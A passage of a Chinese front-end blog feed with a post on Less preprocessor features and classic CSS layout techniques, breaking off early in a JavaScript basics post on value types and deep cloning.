    <summary type="html">&lt;h1 id=&quot;Web安全&quot;&gt;&lt;a href=&quot;#Web安全&quot; class=&quot;headerlink&quot; title=&quot;Web安全&quot;&gt;&lt;/a&gt;Web安全&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;Tips：本科信安，，这应该算是俺的老本行了。。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    <category term="前端八股文" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF%E5%85%AB%E8%82%A1%E6%96%87/"/>
    
    
    <category term="前端面试" scheme="http://yoursite.com/tags/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95/"/>
    
    <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>关于CSS预处理与经典布局</title>
    <link href="http://yoursite.com/2021/05/18/%E5%85%B3%E4%BA%8ECSS%E9%A2%84%E5%A4%84%E7%90%86%E4%B8%8E%E7%BB%8F%E5%85%B8%E5%B8%83%E5%B1%80/"/>
    <id>http://yoursite.com/2021/05/18/%E5%85%B3%E4%BA%8ECSS%E9%A2%84%E5%A4%84%E7%90%86%E4%B8%8E%E7%BB%8F%E5%85%B8%E5%B8%83%E5%B1%80/</id>
    <published>2021-05-18T09:33:16.000Z</published>
    <updated>2021-07-29T16:43:17.358Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于CSS预处理与经典布局"><a href="#关于CSS预处理与经典布局" class="headerlink" title="关于CSS预处理与经典布局"></a>关于CSS预处理与经典布局</h1><h2 id="CSS预处理器"><a href="#CSS预处理器" class="headerlink" title="CSS预处理器"></a>CSS预处理器</h2><ul><li>基于CSS的另一种语言</li><li>通过工具编译为CSS</li><li>添加了很多CSS不具备的特性</li><li>主要有less和sass</li></ul><h3 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h3><p>输出CSS：</p><div class="hljs"><pre><code class="hljs javascript">./node_modules/.bin/lessc ./src/index.less &gt; 。/src/index.css</code></pre></div><h4 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h4><div class="hljs"><pre><code class="hljs less"><span class="hljs-selector-class">.wrapper</span> &#123;    <span class="hljs-attribute">background-color</span>: aliceblue;    <span class="hljs-selector-class">.nav</span> &#123;        <span class="hljs-attribute">font-size</span>: medium;    &#125;    <span class="hljs-selector-class">.content</span> &#123;        <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;        <span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-pseudo">:hover</span> &#123;            <span class="hljs-attribute">background-color</span>: aqua;        &#125;    &#125;&#125;<span class="hljs-comment">// CSS</span><span class="hljs-selector-class">.wrapper</span> &#123;  <span class="hljs-attribute">background-color</span>: aliceblue;&#125;<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.nav</span> &#123;  <span class="hljs-attribute">font-size</span>: medium;&#125;<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.content</span> &#123;  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;&#125;<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.content</span><span class="hljs-selector-pseudo">:hover</span> &#123;  <span class="hljs-attribute">background-color</span>: aqua;&#125;</code></pre></div><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><div class="hljs"><pre><code class="hljs less"><span class="hljs-variable">@fontSize:</span> <span class="hljs-number">12px</span>;<span class="hljs-variable">@bgColor:</span> red;<span class="hljs-selector-class">.wrapper</span> &#123;    <span class="hljs-attribute">background-color</span>: aliceblue;    <span class="hljs-selector-class">.nav</span> &#123;        <span class="hljs-attribute">font-size</span>: <span class="hljs-variable">@fontSize</span>;    &#125;    <span class="hljs-selector-class">.content</span> &#123;        <span class="hljs-attribute">font-size</span>: <span class="hljs-variable">@fontSize</span> + <span class="hljs-number">2px</span>;        <span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-pseudo">:hover</span> &#123;            <span class="hljs-attribute">background-color</span>: lighten(<span class="hljs-variable">@bgColor</span>, <span class="hljs-number">40%</span>);        &#125;    &#125;&#125;<span class="hljs-comment">// CSS</span><span class="hljs-selector-class">.wrapper</span> &#123;  <span class="hljs-attribute">background-color</span>: aliceblue;&#125;<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.nav</span> &#123;  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;&#125;<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.content</span> &#123;  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;&#125;<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.content</span><span class="hljs-selector-pseudo">:hover</span> &#123;  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ffcccc</span>;&#125;</code></pre></div><h4 id="mixin"><a href="#mixin" class="headerlink" title="mixin"></a>mixin</h4><p>如果有一段CSS样式需要复用，没有预处理器的做法是给需要这个样式的元素加上相同的class，也就是在HTML中复用。</p><p>如果想在CSS中复用而不增加class可以用mixin（类似一个函数？）：</p><div class="hljs"><pre><code class="hljs less"><span class="hljs-variable">@fontSize:</span> <span class="hljs-number">12px</span>;<span class="hljs-variable">@bgColor:</span> red;<span class="hljs-selector-class">.block</span>(<span class="hljs-variable">@fontSize</span>) &#123;    <span class="hljs-attribute">font-size</span>: <span class="hljs-variable">@fontSize</span>;    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;&#125;<span class="hljs-selector-class">.wrapper</span> &#123;    <span class="hljs-attribute">background-color</span>: aliceblue;    <span class="hljs-selector-class">.nav</span> &#123;        <span class="hljs-selector-class">.block</span>(<span class="hljs-variable">@fontSize</span>);    &#125;    <span class="hljs-selector-class">.content</span> &#123;        <span class="hljs-selector-class">.block</span>(<span class="hljs-variable">@fontSize</span> + <span class="hljs-number">2px</span>);        <span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-pseudo">:hover</span> &#123;            <span class="hljs-attribute">background-color</span>: lighten(<span class="hljs-variable">@bgColor</span>, <span class="hljs-number">40%</span>);        &#125;    &#125;&#125;<span class="hljs-comment">// CSS</span><span class="hljs-selector-class">.wrapper</span> &#123;  <span class="hljs-attribute">background-color</span>: aliceblue;&#125;<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.nav</span> &#123;  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;&#125;<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.content</span> &#123;  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;&#125;<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.content</span><span class="hljs-selector-pseudo">:hover</span> &#123;  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ffcccc</span>;&#125;</code></pre></div><p>注意，不加括号的类也可以作为mixin，但加上括号后不会在CSS中编译出来（空括号也可以）</p><h4 id="extend"><a href="#extend" class="headerlink" title="extend"></a>extend</h4><p>太多的mixin也会有很多重复代码，可以用extend复用，它能把公共样式提取后整合选择器</p><div class="hljs"><pre><code class="hljs less"><span class="hljs-variable">@fontSize:</span> <span class="hljs-number">12px</span>;<span class="hljs-variable">@bgColor:</span> red;<span class="hljs-selector-class">.block</span>&#123;    <span class="hljs-attribute">font-size</span>: <span class="hljs-variable">@fontSize</span>;    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;&#125;<span class="hljs-selector-class">.wrapper</span> &#123;    <span class="hljs-attribute">background-color</span>: aliceblue;    <span class="hljs-selector-class">.nav</span><span class="hljs-selector-pseudo">:extend(.block)</span>&#123;        <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;    &#125;    <span class="hljs-selector-class">.content</span> &#123;        <span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-pseudo">:extend(.block)</span>;        <span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-pseudo">:hover</span> &#123;            <span class="hljs-attribute">background-color</span>: lighten(<span class="hljs-variable">@bgColor</span>, <span class="hljs-number">40%</span>);        &#125;    &#125;&#125;<span class="hljs-comment">// CSS</span><span class="hljs-selector-class">.block</span>,<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.nav</span>,<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.content</span> &#123;  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;&#125;<span class="hljs-selector-class">.wrapper</span> &#123;  <span class="hljs-attribute">background-color</span>: aliceblue;&#125;<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.nav</span> &#123;  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;&#125;<span class="hljs-selector-class">.wrapper</span> <span class="hljs-selector-class">.content</span><span class="hljs-selector-pseudo">:hover</span> &#123;  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ffcccc</span>;&#125;</code></pre></div><h4 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h4><p>用mixin能传参的性质实现，没有循环，实际是用递归实现的：</p><div class="hljs"><pre><code class="hljs less"><span class="hljs-selector-class">.gen-col</span>(<span class="hljs-variable">@n</span>) <span class="hljs-keyword">when</span> (<span class="hljs-variable">@n</span> &gt; <span class="hljs-number">0</span>) &#123;    <span class="hljs-selector-class">.gen-col</span>(<span class="hljs-variable">@n</span> - <span class="hljs-number">1</span>);    <span class="hljs-selector-class">.col-</span><span class="hljs-variable">@&#123;n&#125;</span> &#123;        <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span> / <span class="hljs-number">5</span> * <span class="hljs-variable">@n</span>;    &#125;&#125;<span class="hljs-selector-class">.gen-col</span>(<span class="hljs-number">5</span>);<span class="hljs-comment">// CSS</span><span class="hljs-selector-class">.col-1</span> &#123;  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span> / <span class="hljs-number">5</span> * <span class="hljs-number">1</span>;&#125;<span class="hljs-selector-class">.col-2</span> &#123;  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span> / <span class="hljs-number">5</span> * <span class="hljs-number">2</span>;&#125;<span class="hljs-selector-class">.col-3</span> &#123;  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span> / <span class="hljs-number">5</span> * <span class="hljs-number">3</span>;&#125;<span class="hljs-selector-class">.col-4</span> &#123;  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span> / <span class="hljs-number">5</span> * <span class="hljs-number">4</span>;&#125;<span class="hljs-selector-class">.col-5</span> &#123;  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span> / <span class="hljs-number">5</span> * <span class="hljs-number">5</span>;&#125;</code></pre></div><h4 id="import-CSS模块化"><a href="#import-CSS模块化" class="headerlink" title="import CSS模块化"></a>import CSS模块化</h4><p>将不同部分的CSS拆分编写，之后统一import进一个文件后编译就能编译到一个大的总集合CSS文件中：</p><div class="hljs"><pre><code class="hljs less"><span class="hljs-comment">// variable.less</span><span class="hljs-variable">@themeColor:</span> blue;<span class="hljs-variable">@fontSize:</span> <span class="hljs-number">14px</span>;<span class="hljs-comment">// module1.less</span><span class="hljs-selector-class">.module1</span> &#123;    <span class="hljs-selector-class">.box</span> &#123;        <span class="hljs-attribute">font-size</span>: <span class="hljs-variable">@fontSize</span> + <span class="hljs-number">2px</span>;        <span class="hljs-attribute">color</span>: <span class="hljs-variable">@themeColor</span>;    &#125;    <span class="hljs-selector-class">.tips</span> &#123;        <span class="hljs-attribute">font-size</span>: <span class="hljs-variable">@fontSize</span>;        <span class="hljs-attribute">color</span>: lighten(<span class="hljs-variable">@themeColor</span>, <span class="hljs-number">40%</span>);    &#125;&#125;<span class="hljs-comment">// module2.less</span><span class="hljs-selector-class">.module2</span> &#123;    <span class="hljs-selector-class">.box</span> &#123;        <span class="hljs-attribute">font-size</span>: <span class="hljs-variable">@fontSize</span> + <span class="hljs-number">4px</span>;        <span class="hljs-attribute">color</span>: <span class="hljs-variable">@themeColor</span>;    &#125;    <span class="hljs-selector-class">.tips</span> &#123;        <span class="hljs-attribute">font-size</span>: <span class="hljs-variable">@fontSize</span> + <span class="hljs-number">2px</span>;        <span class="hljs-attribute">color</span>: lighten(<span class="hljs-variable">@themeColor</span>, <span class="hljs-number">20%</span>);    &#125;&#125;<span class="hljs-comment">// index.less 依然只用lessc编译这个文件</span><span class="hljs-keyword">@import</span> <span class="hljs-string">"./variable.less"</span>;<span class="hljs-keyword">@import</span> <span class="hljs-string">"./module1.less"</span>;<span class="hljs-keyword">@import</span> <span class="hljs-string">"./module2.less"</span>;<span class="hljs-comment">// CSS</span><span class="hljs-selector-class">.module1</span> <span class="hljs-selector-class">.box</span> &#123;  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;  <span class="hljs-attribute">color</span>: blue;&#125;<span class="hljs-selector-class">.module1</span> <span class="hljs-selector-class">.tips</span> &#123;  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;  <span class="hljs-attribute">color</span>: <span class="hljs-number">#ccccff</span>;&#125;<span class="hljs-selector-class">.module2</span> <span class="hljs-selector-class">.box</span> &#123;  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;  <span class="hljs-attribute">color</span>: blue;&#125;<span class="hljs-selector-class">.module2</span> <span class="hljs-selector-class">.tips</span> &#123;  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;  <span class="hljs-attribute">color</span>: <span class="hljs-number">#6666ff</span>;&#125;</code></pre></div><p>CSS预处理器还有框架可以用！！</p><h2 id="CSS经典布局"><a href="#CSS经典布局" class="headerlink" title="CSS经典布局"></a>CSS经典布局</h2><h3 id="水平垂直居中"><a href="#水平垂直居中" class="headerlink" title="水平垂直居中"></a>水平垂直居中</h3><h4 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h4><p>margin 0 auto</p><p>text-align: center （给父元素设置，居中的div要设置inline-block）</p><h4 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h4><div class="hljs"><pre><code class="hljs css">// 一般和水平居中一起实现// 确定宽高的容器<span class="hljs-selector-tag">div</span> &#123;    <span class="hljs-attribute">position</span>: absolute;    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;    <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;    <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;    <span class="hljs-attribute">margin</span>: -<span class="hljs-number">50px</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> -<span class="hljs-number">100px</span> // 往上往左偏移一半&#125;// 不确定宽高<span class="hljs-selector-tag">div</span> &#123;    <span class="hljs-attribute">position</span>: absolute;    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;    <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;    <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;    transform: translate(-50%, -50%); // 与上方相同&#125;// flex布局<span class="hljs-selector-class">.container</span> &#123;    <span class="hljs-attribute">display</span>: flex;    justify-content: center; // 水平    align-items: center; // 垂直&#125;<span class="hljs-selector-class">.container</span> <span class="hljs-selector-tag">div</span> &#123;    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;&#125;</code></pre></div><h3 id="三栏布局"><a href="#三栏布局" class="headerlink" title="三栏布局"></a>三栏布局</h3><p>三栏布局一般指的是页面中一共有三栏，左右两栏宽度固定，中间自适应的布局，注意为了保证中间的内容最先被渲染，center的盒子是要放在最上面的！html代码如下：</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"center"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"left"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"right"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre></div><p>以下样式全部按照左边定宽100px，中间自适应，右边定宽200px</p><h4 id="绝对定位实现"><a href="#绝对定位实现" class="headerlink" title="绝对定位实现"></a>绝对定位实现</h4><p>左右两栏设置绝对定位，中间设置对应的margin</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;    <span class="hljs-attribute">position</span>: relative;&#125;<span class="hljs-selector-class">.left</span>&#123;    <span class="hljs-attribute">background-color</span>: coral;    <span class="hljs-attribute">position</span>: absolute;    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;    <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;&#125;<span class="hljs-selector-class">.right</span> &#123;    <span class="hljs-attribute">background-color</span>: cornflowerblue;    <span class="hljs-attribute">position</span>: absolute;    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;    <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;&#125;<span class="hljs-selector-class">.center</span> &#123;    <span class="hljs-attribute">background-color</span>: darkgreen;    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">200px</span> <span class="hljs-number">0</span> <span class="hljs-number">100px</span>;&#125;</code></pre></div><h4 id="flex实现"><a href="#flex实现" class="headerlink" title="flex实现"></a>flex实现</h4><p>左右两栏的放大和缩小比例都设置为0，基础大小设置为固定的大小，中间一栏设置为auto</p><div class="hljs"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;    <span class="hljs-attribute">display</span>: flex;&#125;<span class="hljs-selector-class">.left</span>&#123;    <span class="hljs-attribute">background-color</span>: coral;    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">100px</span>;    <span class="hljs-attribute">order</span>: <span class="hljs-number">0</span>;&#125;<span class="hljs-selector-class">.right</span> &#123;    <span class="hljs-attribute">background-color</span>: cornflowerblue;    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">200px</span>;    <span class="hljs-attribute">order</span>: <span class="hljs-number">2</span>;&#125;<span class="hljs-selector-class">.center</span> &#123;    <span class="hljs-attribute">background-color</span>: darkgreen;    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span> <span class="hljs-number">0</span> auto;    <span class="hljs-attribute">order</span>: <span class="hljs-number">1</span>;&#125;</code></pre></div><p>记得要加order指定下排列顺序</p><h4 id="圣杯布局"><a href="#圣杯布局" class="headerlink" title="圣杯布局"></a>圣杯布局</h4><p>利用浮动和负边距来实现。父级元素设置左右的 padding，三列均设置浮动，两列都被挤到了下一行，通过设置 margin 负值将其移动到上一行，再利用相对定位到两边。</p><div class="hljs"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;    <span class="hljs-attribute">padding-left</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">padding-right</span>: <span class="hljs-number">200px</span>;&#125;<span class="hljs-selector-class">.left</span>&#123;    <span class="hljs-attribute">background-color</span>: coral;    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">float</span>: left;    <span class="hljs-attribute">position</span>: relative;    <span class="hljs-attribute">left</span>: -<span class="hljs-number">100px</span>;    <span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">100%</span>;&#125;<span class="hljs-selector-class">.right</span> &#123;    <span class="hljs-attribute">background-color</span>: cornflowerblue;    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">float</span>: right;    <span class="hljs-attribute">margin-right</span>: -<span class="hljs-number">200px</span>;&#125;<span class="hljs-selector-class">.center</span> &#123;    <span class="hljs-attribute">background-color</span>: darkgreen;    <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;    <span class="hljs-attribute">float</span>: left;&#125;</code></pre></div><h3 id="宽高自适应的正方形"><a href="#宽高自适应的正方形" class="headerlink" title="宽高自适应的正方形"></a>宽高自适应的正方形</h3><p>html如下：</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"square"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre></div><h4 id="用vw实现"><a href="#用vw实现" class="headerlink" title="用vw实现"></a>用vw实现</h4><p>什么是vw？</p><p>​    响应式布局的实现依靠媒体查询（ Media Queries ）来实现，选取主流设备宽度尺寸作为断点针对性写额外的样式进行适配，但这样做会比较麻烦，只能在选取的几个主流设备尺寸下呈现完美适配。 即使是通过 rem 单位来实现适配，也是需要内嵌一段脚本去动态计算根元素大小。</p><p>​    在桌面端，视口指的是浏览器的可视区域；而在移动端较为复杂，它涉及到三个视口：分别是 Layout Viewport（布局视口）、 Visual Viewport（视觉视口）、Ideal Viewport。 而视口单位中的“视口”，在桌面端，毫无疑问指的就是<strong>浏览器的可视区域</strong>；但是在移动端，它指的则是三个 Viewport 中的 Layout Viewport 。</p><p>根据CSS3规范，视口单位主要包括以下4个：</p><ul><li>vw : 1vw 等于视口宽度的1%</li><li>vh : 1vh 等于视口高度的1%</li><li>vmin : 选取 vw 和 vh 中最小的那个</li><li>vmax : 选取 vw 和 vh 中最大的那个</li></ul><p><strong><em>注意：视口单位区别于%单位，视口单位是依赖于视口的尺寸，根据视口尺寸的百分比来定义的；而%单位则是依赖于元素的祖先元素。</em></strong></p><p>CSS实现：</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-class">.square</span> &#123;    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#bfa</span>;    <span class="hljs-attribute">width</span>: <span class="hljs-number">10vw</span>;    <span class="hljs-attribute">height</span>: <span class="hljs-number">10vw</span>;&#125;</code></pre></div><h4 id="margin-padding实现"><a href="#margin-padding实现" class="headerlink" title="margin/padding实现"></a>margin/padding实现</h4><p>元素的margin/padding在设置百分比时是相对父元素width的：</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-class">.square</span> &#123;    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#bfa</span>;    <span class="hljs-attribute">width</span>: <span class="hljs-number">10vw</span>;    <span class="hljs-attribute">padding-top</span>: <span class="hljs-number">10%</span>;&#125;</code></pre></div><h4 id="利用子元素的margin-top"><a href="#利用子元素的margin-top" class="headerlink" title="利用子元素的margin-top"></a>利用子元素的margin-top</h4><p>给这个盒子加个儿子伪元素，而这个儿子的margin百分比也是按它本身宽度来的，注意父元素要开启BFC，不然儿子的MT会加在父元素头上而不是内部，也就撑不开父元素：</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-class">.square</span> &#123;    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#bfa</span>;    <span class="hljs-attribute">overflow</span>: hidden;    <span class="hljs-attribute">width</span>: <span class="hljs-number">30vw</span>;&#125;<span class="hljs-selector-class">.square</span><span class="hljs-selector-pseudo">::after</span> &#123;    <span class="hljs-attribute">content</span>: <span class="hljs-string">''</span>;    <span class="hljs-attribute">display</span>: block;    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">100%</span>;&#125;</code></pre></div><h3 id="三角形"><a href="#三角形" class="headerlink" title="三角形"></a>三角形</h3><p>利用元素边框连接处会等分的原理：（画圆用border-radius）</p><p>比如一个角朝上的三角形，要求底宽100px，高50px（延用上文的square）：</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-class">.square</span> &#123;    <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;    <span class="hljs-attribute">border-left</span>: <span class="hljs-number">50px</span> solid transparent;    <span class="hljs-attribute">border-right</span>: <span class="hljs-number">50px</span> solid transparent;    <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">50px</span> solid <span class="hljs-number">#bfa</span>;&#125;</code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关于CSS预处理与经典布局&quot;&gt;&lt;a href=&quot;#关于CSS预处理与经典布局&quot; class=&quot;headerlink&quot; title=&quot;关于CSS预处理与经典布局&quot;&gt;&lt;/a&gt;关于CSS预处理与经典布局&lt;/h1&gt;&lt;h2 id=&quot;CSS预处理器&quot;&gt;&lt;a href=&quot;#CS</summary>
      
    
    
    
    <category term="前端八股文" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF%E5%85%AB%E8%82%A1%E6%96%87/"/>
    
    
    <category term="前端面试" scheme="http://yoursite.com/tags/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95/"/>
    
    <category term="CSS" scheme="http://yoursite.com/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>JS基础</title>
    <link href="http://yoursite.com/2021/04/22/JS%E5%9F%BA%E7%A1%80%E9%9D%A2%E8%AF%95/"/>
    <id>http://yoursite.com/2021/04/22/JS%E5%9F%BA%E7%A1%80%E9%9D%A2%E8%AF%95/</id>
    <published>2021-04-22T05:10:52.000Z</published>
    <updated>2021-07-29T16:44:19.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JS基础"><a href="#JS基础" class="headerlink" title="JS基础"></a>JS基础</h1><p><strong><em>内容包含：原型、原型链、作用域、闭包、异步、单线程、DOM、BOM、Ajax、跨域、事件、存储</em></strong></p><h2 id="变量类型和计算"><a href="#变量类型和计算" class="headerlink" title="变量类型和计算"></a>变量类型和计算</h2><h3 id="值类型和引用类型"><a href="#值类型和引用类型" class="headerlink" title="值类型和引用类型"></a>值类型和引用类型</h3><p>值类型用栈存储，引用类型用堆存储，不同存储的原因是数据结构的不同，值类型占内存小且结构简单，引用类型相反。</p><p>常见引用类型：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<span class="hljs-keyword">const</span> n = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 特殊引用类型 指针指向空</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fn</span>(<span class="hljs-params"></span>) </span>&#123;&#125; <span class="hljs-comment">// 特殊引用类型 不用于存储数据所以没有“深拷贝”</span></code></pre></div><h3 id="typeof和深拷贝"><a href="#typeof和深拷贝" class="headerlink" title="typeof和深拷贝"></a>typeof和深拷贝</h3><p>typeof：</p><ul><li>识别所有<em>值类型</em></li><li>能判断函数 ‘function’</li><li>识别引用类型 ‘object’ 但无法继续识别更深层次，比如这个对象属于哪类 –&gt; null和{x:100}都是‘object’</li></ul><p>深拷贝：记得递归检查对象内部的值是否也是复杂对象</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deepClone</span>(<span class="hljs-params">obj = &#123;&#125;</span>) </span>&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">'object'</span> || obj == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> obj;    <span class="hljs-keyword">let</span> res;    <span class="hljs-keyword">if</span>(obj <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) res = [];    <span class="hljs-keyword">else</span> res = &#123;&#125;;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) &#123;        <span class="hljs-comment">// 保证key不是原型属性</span>        <span class="hljs-keyword">if</span>(obj.hasOwnProperty(key)) &#123;            res[key] = deepClone(obj[key]);        &#125;    &#125;    